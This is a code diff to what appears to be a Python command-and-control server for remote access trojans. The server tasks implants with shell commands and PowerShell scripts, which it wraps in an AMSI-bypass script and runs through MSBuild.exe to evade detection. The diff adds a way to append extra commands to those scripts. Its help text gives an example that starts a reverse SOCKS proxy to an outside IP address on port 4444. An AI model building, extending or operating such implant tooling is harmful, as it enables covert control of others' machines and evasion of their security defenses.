@@ -20,13 +20,15 @@ UNDERLINE = '\033[4m'
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", default=8080, action="store", dest="port")
-parser.add_argument("-s", "--ssl", help="Enable HTTPS listener instead of default HTTP", default=False, action="store_true", dest="ssl")
+parser.add_argument("-s", "--ssl", help="Start listener using HTTPS instead of HTTP (default)", default=False, action="store_true", dest="ssl")
 args = parser.parse_args()
 port = args.port
 ssl = args.ssl
 
 supported_types = ["c", "py", "js", "ps1", "hta"]
 msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
+
+# Only applies to hta and js rats
 prepend_amsi_bypass_to_psh = True
 
 # I should probably make a dict of dicts...
@@ -100,6 +102,7 @@ def colors(value):
         else:
             return(BOLD + py + value + ENDC)
     except:
+        # Truncate reeeeally long commands over 120 characters
         if(len(value) > 120):
             return(UNDERLINE + value[0:116] + ENDC + "...")
         else:
@@ -122,9 +125,12 @@ def send_ratcode(ratID):
             ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
             return(ratcode)
 
-def get_psscript(filepath):
+def create_psscript(filepath, extra_cmds=""):
     with open(Path(filepath).resolve() , "r") as fd:
         data = fd.read()
+        if(extra_cmds):
+            data += "\n" + extra_cmds
+
         b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
         return(b64data)
 
@@ -134,7 +140,7 @@ def send_msbuild_xml(script):
 
     amsi = ""
     if(prepend_amsi_bypass_to_psh):
-        amsi = get_psscript(os.getcwd() + "/resources/Disable-Amsi.ps1")
+        amsi = create_psscript(os.getcwd() + "/resources/Disable-Amsi.ps1")
 
     msbuild_data = msbuild_data.replace("~~AMSI~~" , amsi)
     return base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
@@ -244,7 +250,8 @@ def get_help():
     print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on agent type")
     print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
     print("spawn -- used to spawn a new rat in a new process.")
-    print("psh <local_powershell_script_path> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
+    print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
+    print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
@@ -281,7 +288,7 @@ if __name__ == "__main__":
             get_help()
 
         # View rats, their types, and their latest checkin times
-        elif(inp == "agents" or inp == "rats" or inp == "impants" or inp == "sessions"):
+        elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
             get_rats()
 
         # Remove rats -- either by ratID or all
@@ -325,10 +332,15 @@ if __name__ == "__main__":
                     elif(str.startswith(inp, "psh ")):
                         try:
                             filepath = inp.split(" ")[1]
+                            extra_cmds = ""
+                            try:
+                                extra_cmds = " ".join(inp.split(" ")[2:])
+                            except:
+                                pass
                             if(types[ratID] == "ps1"):
-                                inp = "psh " + get_psscript(filepath)
+                                inp = "psh " + create_psscript(filepath, extra_cmds)
                             else:
-                                inp = "psh " + msbuild_path + " " + send_msbuild_xml(get_psscript(filepath))
+                                inp = "psh " + msbuild_path + " " + send_msbuild_xml(create_psscript(filepath, extra_cmds))
                         except:
                             print("[!] Could not open file " + filepath + " for reading")
                             continue
